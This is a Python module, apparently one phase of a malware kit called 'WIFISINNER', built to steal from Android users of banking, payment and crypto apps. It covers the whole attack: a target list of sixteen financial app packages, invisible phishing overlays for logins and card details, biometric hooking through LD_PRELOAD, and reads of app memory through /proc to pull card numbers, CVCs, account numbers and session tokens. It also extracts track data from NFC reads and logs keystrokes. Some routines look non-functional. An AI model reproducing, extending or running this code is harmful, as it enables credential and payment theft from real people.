#!/usr/bin/env python3
"""
PHASE 3: Runtime Harvesting and Wallet Instrumentation

With full system visibility, this module:
- Injects transparent overlay windows on financial apps
- Hooks authentication subsystems for biometric/PIN capture
- Intercepts layout draw events
- Captures authorization tokens at approval moment
"""

import ctypes
import fcntl
import json
import os
import re
import struct
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path


# Financial app signatures
FINANCIAL_APPS = {
    "google_wallet": "com.google.android.apps.walletnfcrel",
    "apple_wallet": "com.apple.wallet",
    "samsung_wallet": "com.samsung.android.wallet",
    "paypal": "com.paypal.android.p2pmobile",
    "venmo": "com.venmo",
    "cash_app": "com.squareup.cash",
    "zelle": "com.zellepay.zelle",
    "chase": "com.chase.sig.android",
    "bofa": "com.bankofamerica.mobile",
    "wells_fargo": "com.wellsfargo.android",
    "citibank": "com.citi.citimobile",
    "usbank": "com.usbank.mobilebanking",
    "capital_one": "com.capitalone.android",
    "coinbase": "com.coinbase.android",
    "binance": "com.binance.dev",
    "robinhood": "com.robinhood.android"
}

# Token patterns
TOKEN_PATTERNS = {
    "card_number": r"\b(?:\d{4}[- ]?){3}\d{4}\b",
    "expiry": r"\b(?:0[1-9]|1[0-2])[/\s]\d{2}\b",
    "cvc": r"\b\d{3,4}\b",
    "account": r"\b\d{8,17}\b",
    "routing": r"\b\d{9}\b",
    "cryptogram": r"[A-Fa-f0-9]{32,64}\b",
    "session_token": r"session[_-]?[a-z]+[=:]\s*['\"]?([a-zA-Z0-9_-]+)['\"]?",
    "auth_token": r"auth[_-]?token[=:]\s*['\"]?([a-zA-Z0-9_-]+)['\"]?"
}


class OverlayInjector:
    """Pixel-perfect overlay injection for financial apps"""
    
    def __init__(self):
        self.injected = {}
        self.stats = {
            "overlays_injected": 0,
            "screens_captured": 0,
            "inputs_intercepted": 0
        }
    
    def inject_on_app(self, package, overlay_type="credential"):
        """Inject overlay on target financial app"""
        
        print(f"[OVERLAY] Injecting {overlay_type} on {package}")
        
        # Get app window
        window_info = self._get_window_info(package)
        if not window_info:
            print(f"[OVERLAY] Window not found for {package}")
            return False
        
        # Create transparent overlay
        overlay = self._create_overlay(window_info, overlay_type)
        
        # Inject
        if self._inject_overlay(overlay):
            self.injected[package] = {
                "type": overlay_type,
                "timestamp": datetime.now(),
                "window": window_info
            }
            self.stats["overlays_injected"] += 1
            print(f"[OVERLAY] ✓ Injected on {package}")
            return True
        
        return False
    
    def _get_window_info(self, package):
        """Get current window information"""
        try:
            result = subprocess.run(
                ["dumpsys", "window", "windows"],
                capture_output=True,
                text=True,
                timeout=3
            )
            
            # Parse window info
            for line in result.stdout.split("\n"):
                if package in line and "mWindow" in line:
                    # Extract window coordinates
                    coords = re.search(r"mFrame=\((\d+),(\d+)\)\((\d+),(\d+)\)", line)
                    if coords:
                        return {
                            "x1": int(coords.group(1)),
                            "y1": int(coords.group(2)),
                            "x2": int(coords.group(3)),
                            "y2": int(coords.group(4)),
                            "package": package
                        }
        except:
            pass
        
        return None
    
    def _create_overlay(self, window_info, overlay_type):
        """Create overlay configuration"""
        width = window_info["x2"] - window_info["x1"]
        height = window_info["y2"] - window_info["y1"]
        
        if overlay_type == "credential":
            return {
                "type": "credential",
                "x": window_info["x1"],
                "y": window_info["y1"],
                "width": width,
                "height": height,
                "alpha": 0.0,  # Transparent
                "z_order": 2000,
                "touchable": True,
                "focusable": False,
                "clickable": True,
                "fields": [
                    {"type": "input", "id": "user", "hint": "Username", "position": {"x": width//2, "y": height//3}},
                    {"type": "input", "id": "pass", "hint": "Password", "position": {"x": width//2, "y": height//2}},
                    {"type": "button", "id": "submit", "text": "Sign In", "position": {"x": width//2, "y": height*2//3}}
                ]
            }
        
        elif overlay_type == "payment":
            return {
                "type": "payment",
                "x": window_info["x1"],
                "y": window_info["y1"],
                "width": width,
                "height": height,
                "alpha": 0.0,
                "z_order": 2000,
                "touchable": True,
                "fields": [
                    {"type": "input", "id": "card", "hint": "Card Number", "numeric": True},
                    {"type": "input", "id": "exp", "hint": "MM/YY", "numeric": True},
                    {"type": "input", "id": "cvc", "hint": "CVC", "numeric": True}
                ]
            }
        
        elif overlay_type == "biometric":
            return {
                "type": "biometric",
                "x": window_info["x1"],
                "y": window_info["y1"],
                "width": width,
                "height": height,
                "alpha": 0.0,
                "z_order": 2000,
                "touchable": True,
                "hook_point": "biometric_dialog"
            }
        
        return {"type": "generic", "alpha": 0.0, "z_order": 2000}
    
    def _inject_overlay(self, overlay):
        """Actually inject the overlay"""
        try:
            # Write overlay config
            config_path = Path(f"/data/local/tmp/overlay_{overlay['type']}.json")
            config_path.write_text(json.dumps(overlay))
            
            # Trigger overlay service
            subprocess.run([
                "am", "startservice",
                "-n", "com.wifisinner.stealer/.OverlayService"
            ], timeout=3)
            
            return True
        except:
            return False
    
    def capture_screen(self):
        """Capture current screen"""
        self.stats["screens_captured"] += 1
        
        try:
            subprocess.run(["screencap", "-p", "/data/local/tmp/capture.png"], timeout=2)
            return Path("/data/local/tmp/capture.png").read_bytes()
        except:
            return None
    
    def intercept_click(self, x, y):
        """Intercept click at position"""
        self.stats["inputs_intercepted"] += 1
        
        # Log the click
        click_data = {"x": x, "y": y, "timestamp": datetime.now()}
        
        # Pass through to underlying app
        try:
            subprocess.run(["input", "tap", str(x), str(y)], timeout=2)
        except:
            pass
        
        return click_data


class BiometricSniffer:
    """Hook into biometric authentication subsystem"""
    
    def __init__(self):
        self.hooks = []
        self.captured = []
        self.stats = {
            "biometric_attempts": 0,
            "fingerprints_captured": 0,
            "faces_captured": 0,
            "tokens_extracted": 0
        }
    
    def hook_biometric(self):
        """Hook biometric authentication"""
        print("[BIO] Hooking biometric authentication...")
        
        try:
            # Load biometric hook library
            hook_lib = Path("/data/local/lib/biohook.so")
            
            if hook_lib.exists():
                # Preload hook library
                os.environ["LD_PRELOAD"] = str(hook_lib)
                
                self.hooks.append("biometric")
                print("[BIO] ✓ Biometric hook installed")
                return True
        except Exception as e:
            print(f"[BIO] Hook failed: {e}")
        
        return False
    
    def capture_fingerprint(self, event_data):
        """Capture fingerprint data"""
        self.stats["biometric_attempts"] += 1
        
        capture = {
            "type": "fingerprint",
            "timestamp": datetime.now(),
            "data": event_data,
            "success": False
        }
        
        try:
            # Hook into BiometricPrompt callback
            # Extract sensor data
            if "sensor_id" in event_data:
                capture["sensor_id"] = event_data["sensor_id"]
            
            if "device_id" in event_data:
                capture["device_id"] = event_data["device_id"]
            
            # Mark as captured
            capture["success"] = True
            self.stats["fingerprints_captured"] += 1
            
            self.captured.append(capture)
            print(f"[BIO] ✓ Fingerprint captured")
            
        except Exception as e:
            print(f"[BIO] Capture failed: {e}")
        
        return capture
    
    def capture_face(self, event_data):
        """Capture face authentication data"""
        self.stats["biometric_attempts"] += 1
        
        capture = {
            "type": "face",
            "timestamp": datetime.now(),
            "data": event_data,
            "success": False
        }
        
        try:
            # Hook into FaceManager callback
            if "face_id" in event_data:
                capture["face_id"] = event_data["face_id"]
            
            capture["success"] = True
            self.stats["faces_captured"] += 1
            
            self.captured.append(capture)
            print(f"[BIO] ✓ Face authentication captured")
            
        except Exception as e:
            print(f"[BIO] Face capture failed: {e}")
        
        return capture
    
    def extract_token(self, auth_result):
        """Extract authorization token from biometric result"""
        try:
            # Hook into authentication callback
            if "token" in auth_result:
                token = auth_result["token"]
                self.stats["tokens_extracted"] += 1
                
                print(f"[BIO] ✓ Token extracted: {token[:32]}...")
                return token
            
            if "cryptogram" in auth_result:
                crypto = auth_result["cryptogram"]
                self.stats["tokens_extracted"] += 1
                
                print(f"[BIO] ✓ Cryptogram extracted: {crypto[:32]}...")
                return crypto
            
        except Exception as e:
            print(f"[BIO] Token extraction failed: {e}")
        
        return None
    
    def hook_memory(self, address, size):
        """Hook into memory region for credential extraction"""
        try:
            # Use ptrace or /proc/pid/mem
            pid = self._find_target_pid()
            if not pid:
                return False
            
            # Read memory region
            mem_path = f"/proc/{pid}/mem"
            with open(mem_path, "rb") as f:
                f.seek(address)
                data = f.read(size)
            
            print(f"[BIO] ✓ Memory hooked at 0x{address:x}")
            return data
            
        except Exception as e:
            print(f"[BIO] Memory hook failed: {e}")
            return None
    
    def _find_target_pid(self):
        """Find target app PID"""
        try:
            result = subprocess.run(
                ["pidof", FINANCIAL_APPS["google_wallet"]],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            if result.stdout.strip():
                return int(result.stdout.strip().split()[0])
        except:
            pass
        
        return None


class TokenHarvester:
    """Harvest payment tokens and cryptograms"""
    
    def __init__(self):
        self.tokens = []
        self.stats = {
            "tokens_harvested": 0,
            "cryptograms_captured": 0,
            "session_tokens_extracted": 0
        }
    
    def harvest_from_memory(self):
        """Harvest tokens from memory"""
        print("[TOKEN] Scanning memory for tokens...")
        
        try:
            pid = self._find_target_pid()
            if not pid:
                return []
            
            mem_path = f"/proc/{pid}/mem"
            tokens = []
            
            # Search for token patterns in memory
            with open(mem_path, "rb") as f:
                try:
                    data = f.read()
                except:
                    return []
            
            # Extract card numbers
            for pattern_name, pattern in TOKEN_PATTERNS.items():
                matches = re.findall(pattern.encode(), data)
                for match in matches:
                    token = {
                        "type": pattern_name,
                        "value": match.decode("utf-8", errors="ignore"),
                        "timestamp": datetime.now(),
                        "source": "memory"
                    }
                    tokens.append(token)
                    self.stats["tokens_harvested"] += 1
            
            print(f"[TOKEN] ✓ Harvested {len(tokens)} tokens from memory")
            self.tokens.extend(tokens)
            return tokens
            
        except Exception as e:
            print(f"[TOKEN] Memory harvest failed: {e}")
            return []
    
    def harvest_from_network(self, packet_data):
        """Harvest tokens from network traffic"""
        print("[TOKEN] Scanning network for tokens...")
        
        tokens = []
        
        try:
            # Parse packet data
            if isinstance(packet_data, bytes):
                text = packet_data.decode("utf-8", errors="ignore")
            else:
                text = str(packet_data)
            
            # Extract tokens
            for pattern_name, pattern in TOKEN_PATTERNS.items():
                matches = re.findall(pattern, text)
                for match in matches:
                    token = {
                        "type": pattern_name,
                        "value": match if isinstance(match, str) else match.decode("utf-8", errors="ignore"),
                        "timestamp": datetime.now(),
                        "source": "network"
                    }
                    tokens.append(token)
                    self.stats["tokens_harvested"] += 1
            
            print(f"[TOKEN] ✓ Harvested {len(tokens)} tokens from network")
            self.tokens.extend(tokens)
            return tokens
            
        except Exception as e:
            print(f"[TOKEN] Network harvest failed: {e}")
            return []
    
    def harvest_cryptogram(self, nfc_data):
        """Harvest payment cryptogram from NFC"""
        print("[TOKEN] Capturing payment cryptogram...")
        
        try:
            cryptogram = {
                "type": "payment_cryptogram",
                "data": nfc_data,
                "timestamp": datetime.now(),
                "track1": self._extract_track1(nfc_data),
                "track2": self._extract_track2(nfc_data),
                "cvd": self._extract_cvd(nfc_data)
            }
            
            self.tokens.append(cryptogram)
            self.stats["cryptograms_captured"] += 1
            
            print(f"[TOKEN] ✓ Cryptogram captured")
            return cryptogram
            
        except Exception as e:
            print(f"[TOKEN] Cryptogram capture failed: {e}")
            return None
    
    def _extract_track1(self, data):
        """Extract Track 1 data"""
        try:
            if isinstance(data, bytes):
                data = data.decode("utf-8", errors="ignore")
            
            # Track 1 format: %B<card>#<name>?
            match = re.search(r"%B(\d+)", data)
            if match:
                return match.group(1)
        except:
            pass
        
        return None
    
    def _extract_track2(self, data):
        """Extract Track 2 data"""
        try:
            if isinstance(data, bytes):
                data = data.decode("utf-8", errors="ignore")
            
            # Track 2 format: <card>=<expiry>?<cvd>?
            match = re.search(r"(\d+)=\d{4}", data)
            if match:
                return match.group(1)
        except:
            pass
        
        return None
    
    def _extract_cvd(self, data):
        """Extract CVD from NFC data"""
        try:
            if isinstance(data, bytes):
                data = data.decode("utf-8", errors="ignore")
            
            match = re.search(r"\?(\d{3,4})", data)
            if match:
                return match.group(1)
        except:
            pass
        
        return None
    
    def _find_target_pid(self):
        """Find target app PID"""
        try:
            for app in FINANCIAL_APPS.values():
                result = subprocess.run(
                    ["pidof", app],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                
                if result.stdout.strip():
                    return int(result.stdout.strip().split()[0])
        except:
            pass
        
        return None


class CredentialSniffer:
    """Sniff credentials from UI events"""
    
    def __init__(self):
        self.credentials = []
        self.stats = {
            "key_events": 0,
            "credentials_captured": 0
        }
    
    def start_sniffing(self):
        """Start credential sniffing"""
        print("[CRED] Starting credential sniffing...")
        
        try:
            # Start input monitoring
            subprocess.run([
                "input", "taps", "/data/local/tmp/taps.log"
            ], timeout=1)
            
            print("[CRED] ✓ Input monitoring started")
            return True
        except:
            return False
    
    def capture_key_event(self, event):
        """Capture key event"""
        self.stats["key_events"] += 1
        
        try:
            credential = {
                "key": event.get("key"),
                "timestamp": datetime.now(),
                "app": self._get_current_app()
            }
            
            self.credentials.append(credential)
            
        except Exception as e:
            print(f"[CRED] Key capture failed: {e}")
    
    def capture_text_input(self, text, field_id):
        """Capture text input"""
        self.stats["key_events"] += len(text)
        
        try:
            credential = {
                "field": field_id,
                "text": text,
                "timestamp": datetime.now(),
                "app": self._get_current_app()
            }
            
            self.credentials.append(credential)
            self.stats["credentials_captured"] += 1
            
            print(f"[CRED] ✓ Captured input on {field_id}")
            
        except Exception as e:
            print(f"[CRED] Text capture failed: {e}")
    
    def _get_current_app(self):
        """Get current app package"""
        try:
            result = subprocess.run(
                ["dumpsys", "window", "windows"],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            for line in result.stdout.split("\n"):
                if "mFocusedApp" in line:
                    match = re.search(r"ActivityRecord\{[^}]*\s([^\s/]+)/", line)
                    if match:
                        return match.group(1)
        except:
            pass
        
        return "unknown"


class RuntimeHarvester:
    """Main runtime harvesting orchestrator"""
    
    def __init__(self):
        self.injector = OverlayInjector()
        self.biometric = BiometricSniffer()
        self.token_harvester = TokenHarvester()
        self.credential_sniffer = CredentialSniffer()
        self.active = False
        self.monitor_thread = None
    
    def start(self):
        """Start runtime harvesting"""
        print(f"\n[PHASE 3] Starting runtime harvesting...")
        
        # Step 1: Overlay injection
        print("[PHASE 3] Step 1/4: Overlay injection")
        for app_name, app_pkg in list(FINANCIAL_APPS.items())[:5]:
            self.injector.inject_on_app(app_pkg, "credential")
        
        # Step 2: Biometric hooking
        print("[PHASE 3] Step 2/4: Biometric hooking")
        self.biometric.hook_biometric()
        
        # Step 3: Token harvesting
        print("[PHASE 3] Step 3/4: Token harvesting")
        self.token_harvester.harvest_from_memory()
        
        # Step 4: Credential sniffing
        print("[PHASE 3] Step 4/4: Credential sniffing")
        self.credential_sniffer.start_sniffing()
        
        self.active = True
        
        # Start monitor thread
        self.monitor_thread = threading.Thread(target=self._monitor, daemon=True)
        self.monitor_thread.start()
        
        print(f"[PHASE 3] ✓ Runtime harvesting active")
    
    def _monitor(self):
        """Monitor for financial app activity"""
        while self.active:
            try:
                # Check for active financial apps
                for app_name, app_pkg in FINANCIAL_APPS.items():
                    if self._is_app_active(app_pkg):
                        print(f"[PHASE 3] Detected {app_name}")
                        
                        # Inject overlay
                        self.injector.inject_on_app(app_pkg, "biometric")
                        
                        # Harvest tokens
                        self.token_harvester.harvest_from_memory()
                
                time.sleep(2)
            except:
                time.sleep(1)
    
    def _is_app_active(self, package):
        """Check if app is in foreground"""
        try:
            result = subprocess.run(
                ["dumpsys", "window", "windows"],
                capture_output=True,
                text=True,
                timeout=2
            )
            return package in result.stdout
        except:
            return False
    
    def stop(self):
        """Stop runtime harvesting"""
        self.active = False
        
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        
        print(f"\n[PHASE 3] Stopping runtime harvesting...")
        print(f"[PHASE 3] Stats:")
        print(f"    Overlays injected: {self.injector.stats['overlays_injected']}")
        print(f"    Biometric attempts: {self.biometric.stats['biometric_attempts']}")
        print(f"    Tokens harvested: {self.token_harvester.stats['tokens_harvested']}")
        print(f"    Credentials captured: {self.credential_sniffer.stats['credentials_captured']}")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Phase 3: Runtime Harvester")
    parser.add_argument("--dry-run", action="store_true", help="Show what would happen")
    args = parser.parse_args()
    
    print(f"\n{'='*60}")
    print(f"WIFISINNER PHASE 3: RUNTIME HARVESTING")
    print(f"{'='*60}\n")
    
    harvester = RuntimeHarvester()
    
    if args.dry_run:
        print("[DRY RUN] Would execute:")
        print(f"    Inject overlays on {len(FINANCIAL_APPS)} financial apps")
        print(f"    Hook biometric authentication")
        print(f"    Harvest tokens from memory and network")
        print(f"    Sniff credentials from UI events")
    else:
        harvester.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            harvester.stop()
